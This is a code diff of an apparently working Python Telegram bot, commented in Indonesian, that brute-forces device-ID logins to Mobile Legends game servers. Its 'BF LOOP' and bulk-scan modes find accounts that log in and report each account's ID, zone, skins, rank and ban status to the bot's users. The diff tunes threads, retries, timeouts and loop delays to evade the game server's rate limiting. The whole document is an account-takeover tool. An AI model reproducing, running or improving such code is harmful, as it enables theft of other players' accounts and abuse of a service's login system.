@@ -1,10 +1,18 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-MLBB BOT — 2 FITUR (NO ANIMATION, BACKGROUND)
+MLBB BOT — 2 FITUR (FIXED)
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 1. ⚡ FAST BULK  — sort skin, skip banned, output TXT+JSON
 2. 🔁 BF LOOP    — UNLIMITED, background, kirim full di akhir
+
+FIXES:
+- Timeout 2s → 10s (fix SOCKET_TIMEOUT)
+- Retry 3x per device (fix fail rate tinggi)
+- Banned detection konservatif (jangan anggap akun baru = banned)
+- Thread diturunkan (hindari rate limit MLBB)
+- TCP_NODELAY + SO_KEEPALIVE + sendall
+- Delay antar loop biar gak di-throttle server
 """
 
 import os, sys, time, socket, struct, zlib, random, uuid, logging
@@ -44,21 +52,28 @@ USERS_DB_FILE = os.path.join(OUTPUT_DIR, "bot_users.json")
 
 MAX_BF_DEVICES   = 999_999
 MAX_BULK_DEVICES = 999_999
-BULK_THREADS     = 16
-BF_THREADS       = 20
 
+# ✅ THREAD DITURUNKAN — hindari rate limit MLBB
+BULK_THREADS = 4      # sebelumnya 16
+BF_THREADS   = 4      # sebelumnya 20
+
+# ✅ TIMEOUT NAIK
+SOCKET_TIMEOUT      = 10    # sebelumnya 2
+SOCKET_TIMEOUT_LONG = 15    # untuk lookup
+
+# ✅ RETRY
+MAX_RETRY_PER_DEVICE = 3
+RETRY_DELAY          = 0.4
+
+# ✅ DELAY ANTAR LOOP (biar server MLBB gak throttle)
+BF_LOOP_DELAY = 1.5
+
+# ✅ BANNED KEYWORDS — lebih spesifik
 BANNED_KEYWORDS = [
-    "banned", "ban", "suspend", "suspended", "blocked",
-    "account banned", "akun diblokir", "diblokir", "dibanned",
-    "permanen", "permanent ban", "permanent banned",
-    "cheat", "hack", "penalti", "penalty", "pelanggaran",
-    "restricted", "restriction", "violation", "violate",
-    "account_lock", "accountlock", "lock_account",
-    "perma", "permanent", "banned_account",
-    "disabled", "deactivated", "terminated",
-    "forbidden", "not_allowed", "no_access",
-    "unusual", "abnormal", "suspicious",
-    "tidak_aktif", "nonaktif", "dibekukan",
+    "account banned", "akun diblokir", "dibanned",
+    "permanent ban", "permanently banned",
+    "account suspended", "account blocked",
+    "banned_account", "account_lock",
 ]
 
 logging.basicConfig(
@@ -278,7 +293,7 @@ class SdpStruct(dict):
 
 
 # ══════════════════════════════════════════════════════════════════════
-# BASE CONNECTION
+# BASE CONNECTION (FIXED)
 # ══════════════════════════════════════════════════════════════════════
 class BaseConnection:
     def __init__(self, host, port):
@@ -298,8 +313,15 @@ class BaseConnection:
 
     def connect(self):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # ✅ Optimasi socket
+        try:
+            self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        except Exception:
+            pass
+        # ✅ Timeout 10s (fix SOCKET_TIMEOUT)
+        self.socket.settimeout(SOCKET_TIMEOUT)
         self.socket.connect((self.host, self.port))
-        self.socket.settimeout(2)
 
     def cleanup(self):
         if self.socket:
@@ -309,19 +331,21 @@ class BaseConnection:
                 pass
             self.sequence = 1
             self.socket = None
+        self.queue_data = b''
 
     def send_data(self, id, sdp):
         packet = SdpStruct({0: id, 1: self.sequence, 5: sdp.data}).data
         buf = zstd.compress(packet)
         flags = (len(buf) + 4) | (16 << 24)
         buf = flags.to_bytes(4, 'big') + buf
-        self.socket.send(buf)
+        # ✅ sendall biar kirim semua
+        self.socket.sendall(buf)
         self.sequence += 1
 
     def recv_data(self):
         try:
             while len(self.queue_data) < 4:
-                data = self.socket.recv(4096)
+                data = self.socket.recv(8192)
                 if not data:
                     return None, None
                 self.queue_data += data
@@ -330,7 +354,7 @@ class BaseConnection:
             ct = flags >> 24
             self.last_header_size = size
             while len(self.queue_data) < size:
-                data = self.socket.recv(4096)
+                data = self.socket.recv(8192)
                 if not data:
                     return None, None
                 self.queue_data += data
@@ -365,7 +389,7 @@ class BaseConnection:
 
 
 # ══════════════════════════════════════════════════════════════════════
-# GAME CONNECTION
+# GAME CONNECTION (FIXED: retry di login)
 # ══════════════════════════════════════════════════════════════════════
 class GameConnection(BaseConnection):
     def __init__(self, device_id, device_model=None):
@@ -420,20 +444,28 @@ class GameConnection(BaseConnection):
             self.host = 'login.ml.youngjoygame.com'
             self.port = 30021
             self.connect()
-        self.send_data(1, self._login_packet())
-        pid, res = self.recv_data()
-        if pid == 2 and res:
-            self.account_id = res.get(0)
-            self.session_key = res[1]
-            zr = res.get(2)
-            if isinstance(zr, list) and zr:
-                self.zone_id = zr[0] if not isinstance(zr[0], dict) else zr[0].get(0, 0)
-            elif isinstance(zr, dict):
-                self.zone_id = zr.get(0, 0)
-            else:
-                self.zone_id = zr
-            self.creation_ts = res.get(19, 0)
-            return True
+
+        # ✅ Retry login 3x
+        for attempt in range(3):
+            try:
+                self.send_data(1, self._login_packet())
+                pid, res = self.recv_data()
+                if pid == 2 and res:
+                    self.account_id = res.get(0)
+                    self.session_key = res[1]
+                    zr = res.get(2)
+                    if isinstance(zr, list) and zr:
+                        self.zone_id = zr[0] if not isinstance(zr[0], dict) else zr[0].get(0, 0)
+                    elif isinstance(zr, dict):
+                        self.zone_id = zr.get(0, 0)
+                    else:
+                        self.zone_id = zr
+                    self.creation_ts = res.get(19, 0)
+                    return True
+                time.sleep(0.3)
+            except Exception:
+                time.sleep(0.3)
+                continue
         return False
 
     def get_game_server(self):
@@ -634,11 +666,17 @@ def extract_player_data(result, role_info=None, creation_ts=0):
 
 
 # ══════════════════════════════════════════════════════════════════════
-# BANNED DETECTION
+# BANNED DETECTION (FIXED: konservatif)
 # ══════════════════════════════════════════════════════════════════════
 def is_banned_response(result, pdata=None) -> bool:
+    """
+    Deteksi banned HANYA kalau ada keyword sangat spesifik.
+    JANGAN anggap akun baru (skin/hero=0, level rendah) sebagai banned.
+    """
     if not result:
         return False
+
+    # Cek keyword spesifik di raw response
     try:
         raw = str(result).lower()
         for kw in BANNED_KEYWORDS:
@@ -646,29 +684,24 @@ def is_banned_response(result, pdata=None) -> bool:
                 return True
     except Exception:
         pass
+
+    # Cek nickname
     try:
         if result.get(0) and len(result[0]) > 0:
             pd = result[0][0]
             nick = str(pd.get(2, "")).lower()
-            for kw in BANNED_KEYWORDS:
+            for kw in ["banned", "diblokir", "suspended"]:
                 if kw in nick:
                     return True
-            lvl = pd.get(3)
-            if lvl is None or (isinstance(lvl, int) and lvl <= 0):
-                return True
     except Exception:
         pass
-    if pdata:
-        sc = pdata.get("skin_count", 0)
-        hc = pdata.get("hero_count", 0)
-        lv = pdata.get("level", 0)
-        if (sc == 0 and hc == 0) or (isinstance(lv, int) and lv <= 0):
-            return True
+
+    # ❌ JANGAN cek skin=0, hero=0, atau level<=0 → itu akun baru, bukan banned
     return False
 
 
 # ══════════════════════════════════════════════════════════════════════
-# SCAN & BF
+# SCAN & BF (FIXED: retry otomatis)
 # ══════════════════════════════════════════════════════════════════════
 def scan_account_detail(device_id: str) -> dict:
     out = {
@@ -677,52 +710,74 @@ def scan_account_detail(device_id: str) -> dict:
         "rank": "-", "high_rank": "-",
         "status": "fail", "error": None, "banned": False,
     }
-    try:
-        with GameConnection(device_id=device_id) as conn:
-            if not conn.connect_to_game_server():
-                out["error"] = "GAME_CONNECT_FAILED"
+
+    last_err = None
+    for attempt in range(MAX_RETRY_PER_DEVICE):
+        try:
+            with GameConnection(device_id=device_id) as conn:
+                if not conn.connect_to_game_server():
+                    last_err = "GAME_CONNECT_FAILED"
+                    time.sleep(RETRY_DELAY)
+                    continue
+
+                acc_id  = conn.account_id
+                zone_id = conn.zone_id
+
+                # Timeout lebih panjang untuk lookup
+                try:
+                    conn.socket.settimeout(SOCKET_TIMEOUT_LONG)
+                except Exception:
+                    pass
+
+                result = conn.lookup_player(acc_id, "id")
+                if not result:
+                    last_err = "LOOKUP_FAILED"
+                    time.sleep(RETRY_DELAY)
+                    continue
+
+                role_info = None
+                try:
+                    role_info = conn.get_skin_role_info(acc_id, zone_id)
+                except Exception:
+                    pass
+
+                pdata = extract_player_data(result, role_info=role_info,
+                                            creation_ts=conn.creation_ts)
+
+                if is_banned_response(result, pdata):
+                    out["banned"] = True
+                    out["status"] = "banned"
+                    out["error"]  = "BANNED"
+                    return out
+
+                if not pdata:
+                    last_err = "EXTRACT_FAILED"
+                    time.sleep(RETRY_DELAY)
+                    continue
+
+                out["player_id"]  = pdata.get("player_id")
+                out["nickname"]   = pdata.get("nickname")
+                out["level"]      = pdata.get("level", 0)
+                out["skin_count"] = pdata.get("skin_count", 0)
+                out["hero_count"] = pdata.get("hero_count", 0)
+                out["matches"]    = pdata.get("matches", 0)
+                out["rank"]       = pdata.get("current_rank", "-")
+                out["high_rank"]  = pdata.get("high_rank", "-")
+                out["status"]     = "success"
                 return out
-            acc_id  = conn.account_id
-            zone_id = conn.zone_id
-            result = conn.lookup_player(acc_id, "id")
-            if not result:
-                out["error"] = "LOOKUP_FAILED"
-                return out
 
-            role_info = None
-            try:
-                role_info = conn.get_skin_role_info(acc_id, zone_id)
-            except Exception:
-                pass
+        except ConnectionError as e:
+            last_err = f"CONN_ERROR: {e}"
+            time.sleep(RETRY_DELAY)
+        except socket.timeout:
+            last_err = "SOCKET_TIMEOUT"
+            time.sleep(RETRY_DELAY)
+        except Exception as e:
+            last_err = f"{type(e).__name__}: {e}"
+            time.sleep(RETRY_DELAY)
 
-            pdata = extract_player_data(result, role_info=role_info,
-                                        creation_ts=conn.creation_ts)
-
-            if is_banned_response(result, pdata):
-                out["banned"] = True
-                out["status"] = "banned"
-                out["error"]  = "BANNED"
-                return out
-
-            if not pdata:
-                out["error"] = "EXTRACT_FAILED"
-                return out
-
-            out["player_id"]  = pdata.get("player_id")
-            out["nickname"]   = pdata.get("nickname")
-            out["level"]      = pdata.get("level", 0)
-            out["skin_count"] = pdata.get("skin_count", 0)
-            out["hero_count"] = pdata.get("hero_count", 0)
-            out["matches"]    = pdata.get("matches", 0)
-            out["rank"]       = pdata.get("current_rank", "-")
-            out["high_rank"]  = pdata.get("high_rank", "-")
-            out["status"]     = "success"
-    except ConnectionError as e:
-        out["error"] = f"CONN_ERROR: {e}"
-    except socket.timeout:
-        out["error"] = "SOCKET_TIMEOUT"
-    except Exception as e:
-        out["error"] = f"{type(e).__name__}: {e}"
+    out["error"] = last_err or "MAX_RETRY"
+    logger.warning(f"[BULK FAIL] {device_id[:30]}... → {out['error']}")
     return out
 
 
@@ -731,23 +786,33 @@ def bf_login_with_device(device_id, device_model=None):
         "status": "fail", "device_id": device_id,
         "info": None, "error": None, "kick": False,
     }
-    try:
-        with GameConnection(device_id=device_id, device_model=device_model) as conn:
-            if not conn.connect_to_game_server():
-                result["error"] = "GAME_CONNECT_FAILED"
+
+    last_err = None
+    for attempt in range(MAX_RETRY_PER_DEVICE):
+        try:
+            with GameConnection(device_id=device_id, device_model=device_model) as conn:
+                if not conn.connect_to_game_server():
+                    last_err = "GAME_CONNECT_FAILED"
+                    time.sleep(RETRY_DELAY)
+                    continue
+                result["status"] = "success"
+                result["info"] = {
+                    "account_id": conn.account_id,
+                    "zone_id": conn.zone_id,
+                }
+                result["kick"] = getattr(conn, "kick_detected", False)
                 return result
-            result["status"] = "success"
-            result["info"] = {
-                "account_id": conn.account_id,
-                "zone_id": conn.zone_id,
-            }
-            result["kick"] = getattr(conn, "kick_detected", False)
-    except ConnectionError as e:
-        result["error"] = f"CONN_ERROR: {e}"
-    except socket.timeout:
-        result["error"] = "SOCKET_TIMEOUT"
-    except Exception as e:
-        result["error"] = f"{type(e).__name__}: {e}"
+        except ConnectionError as e:
+            last_err = f"CONN_ERROR: {e}"
+            time.sleep(RETRY_DELAY)
+        except socket.timeout:
+            last_err = "SOCKET_TIMEOUT"
+            time.sleep(RETRY_DELAY)
+        except Exception as e:
+            last_err = f"{type(e).__name__}: {e}"
+            time.sleep(RETRY_DELAY)
+
+    result["error"] = last_err or "MAX_RETRY"
     return result
 
 
@@ -961,7 +1026,7 @@ async def input_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ══════════════════════════════════════════════════════════════════════
-# ⚡ FAST BULK — BACKGROUND, NO ANIMATION
+# ⚡ FAST BULK
 # ══════════════════════════════════════════════════════════════════════
 async def bulk_input(update, context):
     uid = update.effective_user.id
@@ -993,7 +1058,6 @@ async def bulk_input(update, context):
         parse_mode="Markdown",
         reply_markup=kb_stop_bulk())
 
-    # Jalan di background, langsung kirim hasil full saat selesai
     asyncio.create_task(_run_bulk(uid, update.effective_chat.id, devs, ev, context))
     return BULK_RUN
 
@@ -1019,15 +1083,11 @@ async def _run_bulk(uid, chat_id, devs, ev, context):
 
             done += 1
 
-            if r.get("banned") or r.get("status") == "banned":
+            # ✅ FIX: status "banned" saja yang dihitung banned
+            if r.get("status") == "banned" or r.get("banned"):
                 banned += 1
             elif r.get("status") == "success":
-                if r.get("skin_count", 0) == 0 and r.get("hero_count", 0) == 0:
-                    banned += 1
-                elif r.get("level", 0) <= 0:
-                    banned += 1
-                else:
-                    succ.append(r)
+                succ.append(r)
             else:
                 fail += 1
 
@@ -1114,7 +1174,6 @@ async def _run_bulk(uid, chat_id, devs, ev, context):
             ],
         }, f, indent=2, ensure_ascii=False)
 
-    # ── Kirim hasil FULL ke Telegram ──
     caption = (
         f"⚡ *FAST BULK SELESAI*\n\n"
         f"📊 Scan     : `{total}`\n"
@@ -1143,7 +1202,7 @@ async def _run_bulk(uid, chat_id, devs, ev, context):
 
 
 # ══════════════════════════════════════════════════════════════════════
-# 🔁 BF LOOP — BACKGROUND, NO ANIMATION, FULL DI AKHIR
+# 🔁 BF LOOP
 # ══════════════════════════════════════════════════════════════════════
 async def bf_input(update, context):
     uid = update.effective_user.id
@@ -1163,7 +1222,6 @@ async def bf_input(update, context):
                                         reply_markup=kb_main())
         return MENU
 
-    # Stop task lama
     old = bf_tasks.get(uid)
     if old and not old["task"].done():
         bf_stop_flags[uid].set()
@@ -1206,14 +1264,12 @@ async def bf_input(update, context):
 
 
 async def _run_bf_loop(context, uid, state, ev):
-    """BF Loop UNLIMITED — jalan di background, kirim full di akhir."""
     cid = state["chat_id"]
     mid = state["msg_id"]
 
     async def render(force=False):
-        """Update ringan di pesan yang sama. Hanya dipanggil sesekali."""
         now = time.time()
-        if not force and (now - state["last_ui_update"]) < 10:  # update tiap 10 detik, bukan 1.5
+        if not force and (now - state["last_ui_update"]) < 10:
             return
         state["last_ui_update"] = now
 
@@ -1254,7 +1310,6 @@ async def _run_bf_loop(context, uid, state, ev):
 
     try:
         while not ev.is_set():
-            # ⏸️ Pause
             while bf_pause.get(uid, False) and not ev.is_set():
                 await asyncio.sleep(1)
 
@@ -1275,7 +1330,7 @@ async def _run_bf_loop(context, uid, state, ev):
                     state["total_scanned"] += 1
 
                     try:
-                        r = fut.result(timeout=45)
+                        r = fut.result(timeout=60)
                     except Exception as e:
                         r = {"status": "fail", "device_id": d, "error": str(e)}
 
@@ -1291,7 +1346,8 @@ async def _run_bf_loop(context, uid, state, ev):
                     await render()
 
             await render(force=True)
-            await asyncio.sleep(0.1)
+            # ✅ Delay antar loop biar server gak throttle
+            await asyncio.sleep(BF_LOOP_DELAY)
 
     except asyncio.CancelledError:
         logger.info(f"[BF] Cancelled uid={uid}")
@@ -1301,17 +1357,14 @@ async def _run_bf_loop(context, uid, state, ev):
         bf_stop_flags.pop(uid, None)
         bf_tasks.pop(uid, None)
 
-        # ── Kirim HASIL FULL ke Telegram (pesan baru, bukan edit) ──
         await _send_bf_full_result(context, cid, state, mid)
 
 
 async def _send_bf_full_result(context, cid, state, mid):
-    """Kirim hasil FULL BF loop: summary + list semua hit + list semua kick."""
     elapsed = time.time() - state["start"]
     hits   = state["hits"]
     kicks  = state["kicked"]
 
-    # ── Header summary ──
     head = (
         f"🏁 *BF LOOP — SELESAI*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -1329,17 +1382,14 @@ async def _send_bf_full_result(context, cid, state, mid):
     except Exception as e:
         logger.warning(f"send head err: {e}")
 
-    # ── List HIT (full) ──
     if hits:
         lines = [f"✅ *HIT* ({len(hits)} akun)\n"]
         for i, (d, info) in enumerate(hits, 1):
             acc  = info.get("account_id", "?")
             zone = info.get("zone_id", "?")
             lines.append(f"`{i:>3}.` acc `{acc}` | zone `{zone}`")
-        # split kalau kepanjangan (>4000 char)
         await _send_long(context, cid, "\n".join(lines))
 
-    # ── List KICKED (full) ──
     if kicks:
         lines = [f"⚠️ *KICKED — Aktif di perangkat lain* ({len(kicks)} akun)\n"]
         for i, (d, info) in enumerate(kicks, 1):
@@ -1348,7 +1398,6 @@ async def _send_bf_full_result(context, cid, state, mid):
             lines.append(f"`{i:>3}.` acc `{acc}` | zone `{zone}`")
         await _send_long(context, cid, "\n".join(lines))
 
-    # ── Update pesan lama jadi status akhir ──
     try:
         await context.bot.edit_message_text(
             chat_id=cid, message_id=mid,
@@ -1363,7 +1412,6 @@ async def _send_bf_full_result(context, cid, state, mid):
 
 
 async def _send_long(context, chat_id, text, limit=4000):
-    """Kirim teks panjang dengan split aman per baris."""
     if len(text) <= limit:
         try:
             await context.bot.send_message(chat_id=chat_id, text=text,
@@ -1403,7 +1451,6 @@ async def bf_pause_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.answer("Tidak ada BF berjalan.", show_alert=True)
         return
     bf_pause[uid] = True
-    # tampilkan status terkini ke user
     st = bf_tasks[uid]["state"]
     try:
         await context.bot.send_message(
@@ -1482,11 +1529,14 @@ def main():
         sys.exit(1)
 
     print("=" * 60)
-    print("🤖 MLBB BOT — 2 FITUR (NO ANIMATION)")
+    print("🤖 MLBB BOT — FIXED VERSION")
     print("=" * 60)
-    print(f"Token : {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
-    print(f"Owner : {OWNER_ID}")
-    print(f"Fitur : FAST BULK | BF LOOP (background, no spam)")
+    print(f"Token        : {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
+    print(f"Owner        : {OWNER_ID}")
+    print(f"Timeout      : {SOCKET_TIMEOUT}s (long: {SOCKET_TIMEOUT_LONG}s)")
+    print(f"Retry/device : {MAX_RETRY_PER_DEVICE}x")
+    print(f"Threads      : BULK={BULK_THREADS} | BF={BF_THREADS}")
+    print(f"Loop delay   : {BF_LOOP_DELAY}s")
     print("=" * 60)
 
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
